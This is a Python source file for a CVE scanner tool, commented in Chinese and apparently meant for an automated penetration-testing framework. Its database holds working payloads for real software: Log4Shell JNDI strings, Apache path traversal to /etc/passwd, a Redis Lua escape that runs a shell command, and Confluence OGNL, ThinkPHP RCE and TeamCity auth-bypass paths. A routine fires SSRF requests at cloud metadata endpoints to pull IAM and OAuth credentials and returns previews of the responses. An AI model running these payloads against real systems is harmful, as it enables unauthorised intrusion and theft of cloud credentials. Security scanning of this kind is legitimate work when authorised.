# tools/cve_scanner.py
"""
CVE漏洞扫描器

支持:
- 高价值CVE自动检测
- 云元数据检测
- 常见服务漏洞扫描
"""
import json
import requests
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from tool_framework import CommandLineTool


@dataclass
class CVEInfo:
    """CVE漏洞信息"""
    cve_id: str
    name: str
    vuln_type: str
    severity: str
    affected: List[str]
    poc: str
    tool: str
    description: str = ""
    port_hints: List[int] = field(default_factory=list)


class CVEDatabase:
    """高价值CVE数据库"""

    # 2023-2025 高价值CVE
    HIGH_VALUE_CVES: Dict[str, CVEInfo] = {
        # ==================== Web服务器 ====================
        "CVE-2021-44228": CVEInfo(
            cve_id="CVE-2021-44228",
            name="Log4Shell",
            vuln_type="rce",
            severity="critical",
            affected=["Log4j 2.0-beta9 - 2.14.1"],
            poc="${jndi:ldap://${hostName}.test.com/a}",
            tool="jndi-exploit",
            description="Log4j JNDI注入远程代码执行",
            port_hints=[8080, 80, 443]
        ),
        "CVE-2021-45046": CVEInfo(
            cve_id="CVE-2021-45046",
            name="Log4Shell Bypass",
            vuln_type="rce",
            severity="critical",
            affected=["Log4j 2.0-beta9 - 2.15.0"],
            poc="${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://...}",
            tool="jndi-exploit",
            description="Log4j绕过变体",
            port_hints=[8080, 80, 443]
        ),

        # ==================== Apache ====================
        "CVE-2021-41773": CVEInfo(
            cve_id="CVE-2021-41773",
            name="Apache Path Traversal",
            vuln_type="lfi",
            severity="critical",
            affected=["Apache 2.4.49"],
            poc="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            tool="requests",
            description="Apache路径穿越",
            port_hints=[80, 443, 8080]
        ),
        "CVE-2021-42013": CVEInfo(
            cve_id="CVE-2021-42013",
            name="Apache Path Traversal v2",
            vuln_type="lfi",
            severity="critical",
            affected=["Apache 2.4.50"],
            poc="/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
            tool="requests",
            description="Apache路径穿越补丁绕过",
            port_hints=[80, 443, 8080]
        ),

        # ==================== Spring ====================
        "CVE-2022-22965": CVEInfo(
            cve_id="CVE-2022-22965",
            name="Spring4Shell",
            vuln_type="rce",
            severity="critical",
            affected=["Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19"],
            poc="class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20...}",
            tool="requests",
            description="Spring Framework RCE",
            port_hints=[8080, 80, 443]
        ),
        "CVE-2022-22947": CVEInfo(
            cve_id="CVE-2022-22947",
            name="Spring Cloud Gateway RCE",
            vuln_type="rce",
            severity="critical",
            affected=["Spring Cloud Gateway 3.1.0, 3.0.0-3.0.6"],
            poc="POST /actuator/gateway/routes/hack",
            tool="requests",
            description="Spring Cloud Gateway SpEL注入",
            port_hints=[8080, 9090]
        ),

        # ==================== Shiro ====================
        "CVE-2016-4437": CVEInfo(
            cve_id="CVE-2016-4437",
            name="Shiro-550",
            vuln_type="deserialization",
            severity="critical",
            affected=["Apache Shiro < 1.2.5"],
            poc="rememberMe Cookie反序列化",
            tool="shiro-550",
            description="Shiro RememberMe反序列化",
            port_hints=[8080, 80, 443]
        ),
        "CVE-2019-12422": CVEInfo(
            cve_id="CVE-2019-12422",
            name="Shiro-721",
            vuln_type="deserialization",
            severity="high",
            affected=["Apache Shiro < 1.4.2"],
            poc="rememberMe CBC Padding Oracle",
            tool="shiro-721",
            description="Shiro CBC Padding Oracle攻击",
            port_hints=[8080, 80, 443]
        ),

        # ==================== WebLogic ====================
        "CVE-2020-14882": CVEInfo(
            cve_id="CVE-2020-14882",
            name="WebLogic Console RCE",
            vuln_type="rce",
            severity="critical",
            affected=["WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0"],
            poc="/console/css/%25%32%65%25%32%65%25%32%fconsole.portal",
            tool="requests",
            description="WebLogic控制台RCE",
            port_hints=[7001, 7002]
        ),
        "CVE-2020-14883": CVEInfo(
            cve_id="CVE-2020-14883",
            name="WebLogic Console Privilege Escalation",
            vuln_type="privilege_escalation",
            severity="high",
            affected=["WebLogic 同上"],
            poc="/console/console.portal?_nfpb=true&_pageLabel=&handle=a.t.f",
            tool="requests",
            description="WebLogic控制台权限提升",
            port_hints=[7001, 7002]
        ),

        # ==================== Tomcat ====================
        "CVE-2020-1938": CVEInfo(
            cve_id="CVE-2020-1938",
            name="Ghostcat",
            vuln_type="lfi",
            severity="high",
            affected=["Tomcat 9.0.0.M1-9.0.17, 8.5.0-8.5.39, 7.0.0-7.0.93"],
            poc="AJP协议文件读取",
            tool="ajpshooter",
            description="Tomcat AJP文件读取",
            port_hints=[8009]
        ),
        "CVE-2020-9484": CVEInfo(
            cve_id="CVE-2020-9484",
            name="Tomcat Session Deserialization",
            vuln_type="deserialization",
            severity="high",
            affected=["Tomcat 10.0.0-M1-10.0.0-M4, 9.0.31-9.0.34, 8.5.51-8.5.54, 7.0.99-7.0.103"],
            poc="PersistentManager 反序列化",
            tool="requests",
            description="Tomcat会话持久化反序列化",
            port_hints=[8080, 8009]
        ),

        # ==================== Redis ====================
        "CVE-2022-0543": CVEInfo(
            cve_id="CVE-2022-0543",
            name="Redis Lua Sandbox Escape",
            vuln_type="rce",
            severity="critical",
            affected=["Redis 2.2 < 5.0.13, 6.0 < 6.0.15, 6.2 < 6.2.5, 7.0 < 7.0-rc3"],
            poc="eval 'local io = package.loaded[\"io\"]; return io.popen(\"id\"):read(\"*a\")' 0",
            tool="redis-cli",
            description="Redis Lua沙箱逃逸",
            port_hints=[6379]
        ),

        # ==================== Jenkins ====================
        "CVE-2024-23897": CVEInfo(
            cve_id="CVE-2024-23897",
            name="Jenkins CLI Arbitrary File Read",
            vuln_type="lfi",
            severity="critical",
            affected=["Jenkins 2.441 及更早版本, LTS 2.426.2 及更早版本"],
            poc="java -jar jenkins-cli.jar -s http://target/ -http help 1 '@/etc/passwd'",
            tool="requests",
            description="Jenkins CLI任意文件读取",
            port_hints=[8080, 8888]
        ),

        # ==================== Confluence ====================
        "CVE-2023-22515": CVEInfo(
            cve_id="CVE-2023-22515",
            name="Confluence Privilege Escalation",
            vuln_type="auth_bypass",
            severity="critical",
            affected=["Confluence 8.0.0-8.0.4, 8.1.0-8.1.3, 8.2.0-8.2.1, 8.3.0-8.3.1"],
            poc="/setup/setupadministrator.action",
            tool="requests",
            description="Confluence管理员创建绕过",
            port_hints=[8090, 80, 443]
        ),
        "CVE-2023-22527": CVEInfo(
            cve_id="CVE-2023-22527",
            name="Confluence OGNL Injection",
            vuln_type="rce",
            severity="critical",
            affected=["Confluence 8.5.0-8.5.3"],
            poc="/template/aui/text-inline.vm?label=aaa'%2b#request.get('javax.servlet.context').getClassLoader().getResource('..')%2b'",
            tool="requests",
            description="Confluence OGNL注入RCE",
            port_hints=[8090, 80, 443]
        ),

        # ==================== JetBrains ====================
        "CVE-2024-27198": CVEInfo(
            cve_id="CVE-2024-27198",
            name="TeamCity Auth Bypass",
            vuln_type="auth_bypass",
            severity="critical",
            affected=["TeamCity < 2023.11.4"],
            poc="/app/rest/users/id:1/tokens/RPC2",
            tool="requests",
            description="TeamCity认证绕过",
            port_hints=[8111]
        ),

        # ==================== Fastjson ====================
        "CVE-2022-25845": CVEInfo(
            cve_id="CVE-2022-25845",
            name="Fastjson RCE",
            vuln_type="deserialization",
            severity="critical",
            affected=["Fastjson < 1.2.83"],
            poc='{"@type":"..."}',
            tool="requests",
            description="Fastjson反序列化RCE",
            port_hints=[8080, 80, 443]
        ),

        # ==================== ThinkPHP ====================
        "CVE-2018-20062": CVEInfo(
            cve_id="CVE-2018-20062",
            name="ThinkPHP 5.x RCE",
            vuln_type="rce",
            severity="critical",
            affected=["ThinkPHP 5.0.0-5.0.23, 5.1.0-5.1.30"],
            poc="/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
            tool="requests",
            description="ThinkPHP 5.x 远程代码执行",
            port_hints=[80, 8080, 443]
        ),
    }

    # 云服务元数据端点
    CLOUD_METADATA_ENDPOINTS = {
        "aws": {
            "endpoints": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/iam/security-credentials/",
            ],
            "headers": {}
        },
        "gcp": {
            "endpoints": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
            ],
            "headers": {"Metadata-Flavor": "Google"}
        },
        "azure": {
            "endpoints": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            "headers": {"Metadata": "true"}
        },
        "aliyun": {
            "endpoints": [
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/user-data/",
                "http://100.100.100.200/latest/ram/security-credentials/",
            ],
            "headers": {}
        },
        "tencent": {
            "endpoints": [
                "http://metadata.tencentyun.com/latest/meta-data/",
                "http://169.254.0.23/latest/meta-data/",
            ],
            "headers": {}
        }
    }

    # 服务到CVE的映射
    SERVICE_CVE_MAP = {
        "apache": ["CVE-2021-41773", "CVE-2021-42013"],
        "nginx": [],
        "tomcat": ["CVE-2020-1938", "CVE-2020-9484"],
        "redis": ["CVE-2022-0543"],
        "weblogic": ["CVE-2020-14882", "CVE-2020-14883"],
        "jenkins": ["CVE-2024-23897"],
        "confluence": ["CVE-2023-22515", "CVE-2023-22527"],
        "teamcity": ["CVE-2024-27198"],
        "spring": ["CVE-2022-22965", "CVE-2022-22947"],
        "shiro": ["CVE-2016-4437", "CVE-2019-12422"],
        "fastjson": ["CVE-2022-25845"],
        "thinkphp": ["CVE-2018-20062"],
        "log4j": ["CVE-2021-44228", "CVE-2021-45046"],
    }

    @classmethod
    def get_cves_for_service(cls, service: str) -> List[CVEInfo]:
        """获取服务相关的CVE列表"""
        service_lower = service.lower()
        cve_ids = cls.SERVICE_CVE_MAP.get(service_lower, [])
        return [cls.HIGH_VALUE_CVES[cve_id] for cve_id in cve_ids if cve_id in cls.HIGH_VALUE_CVES]

    @classmethod
    def get_cves_for_port(cls, port: int) -> List[CVEInfo]:
        """根据端口号获取可能的CVE"""
        results = []
        for cve_id, cve_info in cls.HIGH_VALUE_CVES.items():
            if port in cve_info.port_hints:
                results.append(cve_info)
        return results


class CVEScanner(CommandLineTool):
    """CVE漏洞扫描器"""

    def __init__(self):
        super().__init__("curl")
        self.timeout = 30
        self.db = CVEDatabase()

    def name(self) -> str:
        return "cve-scanner"

    def description(self) -> str:
        return "高价值CVE漏洞扫描器，支持Log4Shell、Spring4Shell、Shiro等常见漏洞检测。"

    def supported_vulns(self) -> list:
        return ["CVE", "RCE", "LFI", "Deserialization", "Auth Bypass"]

    def check_available(self) -> bool:
        return True

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {
                "type": "str",
                "description": "目标URL或主机",
                "required": True
            },
            "cve_id": {
                "type": "str",
                "description": "指定CVE编号（可选）",
                "required": False
            },
            "service": {
                "type": "str",
                "description": "服务类型（可选），如tomcat、redis、weblogic",
                "required": False
            },
            "port": {
                "type": "int",
                "description": "端口号（可选）",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行CVE扫描"""
        target = params.get("target") or target
        if not target:
            return {"error": "必须提供目标", "success": False}

        results = {
            "target": target,
            "cves_scanned": [],
            "vulnerabilities": [],
            "cloud_metadata": {}
        }

        # 1. 扫描指定的CVE
        if params.get("cve_id"):
            cve_info = self.db.HIGH_VALUE_CVES.get(params["cve_id"])
            if cve_info:
                vuln_result = self._scan_single_cve(target, cve_info)
                results["cves_scanned"].append(params["cve_id"])
                if vuln_result.get("vulnerable"):
                    results["vulnerabilities"].append(vuln_result)

        # 2. 根据服务扫描
        elif params.get("service"):
            cves = self.db.get_cves_for_service(params["service"])
            for cve_info in cves:
                vuln_result = self._scan_single_cve(target, cve_info)
                results["cves_scanned"].append(cve_info.cve_id)
                if vuln_result.get("vulnerable"):
                    results["vulnerabilities"].append(vuln_result)

        # 3. 根据端口扫描
        elif params.get("port"):
            cves = self.db.get_cves_for_port(params["port"])
            for cve_info in cves:
                vuln_result = self._scan_single_cve(target, cve_info)
                results["cves_scanned"].append(cve_info.cve_id)
                if vuln_result.get("vulnerable"):
                    results["vulnerabilities"].append(vuln_result)

        # 4. 快速扫描所有高价值CVE
        else:
            for cve_id, cve_info in self.db.HIGH_VALUE_CVES.items():
                if cve_info.severity == "critical":
                    vuln_result = self._scan_single_cve(target, cve_info)
                    results["cves_scanned"].append(cve_id)
                    if vuln_result.get("vulnerable"):
                        results["vulnerabilities"].append(vuln_result)

        # 5. 云元数据检测
        results["cloud_metadata"] = self._scan_cloud_metadata(target)

        return results

    def _scan_single_cve(self, target: str, cve_info: CVEInfo) -> Dict:
        """扫描单个CVE"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        try:
            # 根据漏洞类型选择检测方法
            if cve_info.vuln_type == "lfi":
                result = self._check_lfi(target, cve_info)
            elif cve_info.vuln_type == "rce":
                result = self._check_rce(target, cve_info)
            elif cve_info.vuln_type == "auth_bypass":
                result = self._check_auth_bypass(target, cve_info)
            elif cve_info.vuln_type == "deserialization":
                result = self._check_deserialization(target, cve_info)
            else:
                result = self._check_generic(target, cve_info)

        except Exception as e:
            result["error"] = str(e)

        return result

    def _check_lfi(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测LFI类型漏洞"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        # 构造测试URL
        poc_path = cve_info.poc
        if target.endswith("/"):
            url = target[:-1] + poc_path
        else:
            url = target + poc_path

        try:
            resp = requests.get(url, timeout=self.timeout, verify=False)

            # 检查是否包含敏感文件内容
            lfi_indicators = [
                "root:", "daemon:", "bin:",  # /etc/passwd
                "[extensions]", "extension =",  # php.ini
                "DB_PASS", "DB_USER", "password",  # 配置文件
            ]

            for indicator in lfi_indicators:
                if indicator in resp.text:
                    result["vulnerable"] = True
                    result["evidence"] = f"Found '{indicator}' in response"
                    break

            if resp.status_code == 200 and len(resp.text) > 0:
                result["response_length"] = len(resp.text)

        except Exception as e:
            result["error"] = str(e)

        return result

    def _check_rce(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测RCE类型漏洞（安全检测，不执行实际命令）"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        # 对于RCE漏洞，我们只检测是否存在漏洞入口，不实际执行命令
        if "log4j" in cve_info.name.lower() or "log4shell" in cve_info.name.lower():
            result = self._check_log4j(target, cve_info)
        elif "spring" in cve_info.name.lower():
            result = self._check_spring(target, cve_info)
        else:
            result = self._check_generic(target, cve_info)

        return result

    def _check_log4j(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测Log4j漏洞（使用DNS回显）"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        # 使用常见的检测Header
        headers_to_test = [
            "User-Agent",
            "X-Forwarded-For",
            "X-Api-Version",
            "Referer",
            "Authentication"
        ]

        # 使用无害的DNS回显payload
        for header in headers_to_test:
            try:
                # 使用dnslog.cn或类似服务的域名
                test_headers = {
                    header: cve_info.poc.replace("${hostName}", "test")
                }
                resp = requests.get(target, headers=test_headers, timeout=self.timeout, verify=False)

                # 检查是否有异常响应
                if resp.status_code in [200, 400, 500]:
                    result["potential_headers"] = result.get("potential_headers", []) + [header]
            except:
                pass

        if result.get("potential_headers"):
            result["evidence"] = f"Potential vulnerable headers: {result['potential_headers']}"
            result["note"] = "Requires DNS callback verification for confirmation"

        return result

    def _check_spring(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测Spring相关漏洞"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        # Spring4Shell检测
        if "Spring4Shell" in cve_info.name:
            # 检查是否存在Tomcat特征
            try:
                resp = requests.get(target, timeout=self.timeout, verify=False)
                if "Apache Tomcat" in resp.text or "tomcat" in resp.headers.get("Server", "").lower():
                    result["evidence"] = "Tomcat detected, potential Spring4Shell target"
                    result["note"] = "Requires exploitation attempt for confirmation"
            except:
                pass

        # Spring Cloud Gateway检测
        elif "Gateway" in cve_info.name:
            actuator_url = f"{target}/actuator/gateway/routes"
            try:
                resp = requests.get(actuator_url, timeout=self.timeout, verify=False)
                if resp.status_code == 200:
                    result["vulnerable"] = True
                    result["evidence"] = "Actuator gateway endpoint accessible"
            except:
                pass

        return result

    def _check_auth_bypass(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测认证绕过漏洞"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        poc_path = cve_info.poc
        if target.endswith("/"):
            url = target[:-1] + poc_path
        else:
            url = target + poc_path

        try:
            resp = requests.get(url, timeout=self.timeout, verify=False, allow_redirects=False)

            # 认证绕过通常返回200或302到管理员页面
            if resp.status_code == 200:
                # 检查是否进入了管理界面
                admin_indicators = ["administrator", "admin", "dashboard", "console", "settings"]
                for indicator in admin_indicators:
                    if indicator in resp.text.lower():
                        result["vulnerable"] = True
                        result["evidence"] = f"Accessed admin interface: found '{indicator}'"
                        break

                if not result["vulnerable"] and len(resp.text) > 100:
                    result["potential"] = True
                    result["evidence"] = f"Got 200 response, length: {len(resp.text)}"

            elif resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "admin" in location.lower() or "dashboard" in location.lower():
                    result["vulnerable"] = True
                    result["evidence"] = f"Redirected to: {location}"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _check_deserialization(self, target: str, cve_info: CVEInfo) -> Dict:
        """检测反序列化漏洞"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        # Shiro检测
        if "shiro" in cve_info.name.lower():
            try:
                resp = requests.get(target, timeout=self.timeout, verify=False)
                # 检查rememberMe cookie
                set_cookie = resp.headers.get("Set-Cookie", "")
                if "rememberMe" in set_cookie or "rememberMe" in resp.cookies:
                    result["vulnerable"] = True
                    result["evidence"] = "Found rememberMe cookie, potential Shiro fingerprint"
                    result["note"] = "Requires ysoserial for exploitation"
            except:
                pass

        # Fastjson检测
        elif "fastjson" in cve_info.name.lower():
            try:
                resp = requests.post(
                    target,
                    json={"@type": "java.net.Inet4Address", "val": "dnslog.test.com"},
                    timeout=self.timeout,
                    verify=False
                )
                # 需要DNS回显确认
                result["potential"] = True
                result["evidence"] = "Endpoint accepts JSON with @type, potential Fastjson"
            except:
                pass

        return result

    def _check_generic(self, target: str, cve_info: CVEInfo) -> Dict:
        """通用CVE检测"""
        result = {
            "cve_id": cve_info.cve_id,
            "name": cve_info.name,
            "severity": cve_info.severity,
            "vulnerable": False,
            "evidence": ""
        }

        poc_path = cve_info.poc
        if target.endswith("/"):
            url = target[:-1] + poc_path
        else:
            url = target + poc_path

        try:
            resp = requests.get(url, timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                result["potential"] = True
                result["evidence"] = f"Got 200 response, length: {len(resp.text)}"
            elif resp.status_code in [403, 401]:
                result["note"] = f"Access denied ({resp.status_code}), endpoint exists"
        except Exception as e:
            result["error"] = str(e)

        return result

    def _scan_cloud_metadata(self, target: str) -> Dict:
        """扫描云元数据端点"""
        results = {}

        for cloud_name, config in self.db.CLOUD_METADATA_ENDPOINTS.items():
            for endpoint in config["endpoints"]:
                try:
                    # 尝试通过SSRF访问元数据
                    ssrf_url = f"{target}?url={endpoint}"
                    resp = requests.get(
                        ssrf_url,
                        headers=config.get("headers", {}),
                        timeout=10,
                        verify=False
                    )

                    if resp.status_code == 200 and len(resp.text) > 10:
                        if cloud_name not in results:
                            results[cloud_name] = []
                        results[cloud_name].append({
                            "endpoint": endpoint,
                            "accessible": True,
                            "data_preview": resp.text[:200]
                        })

                except:
                    pass

        return results


# 工具注册
def register():
    """注册CVE扫描器"""
    from tool_framework import ToolRegistry
    scanner = CVEScanner()
    ToolRegistry.register(scanner)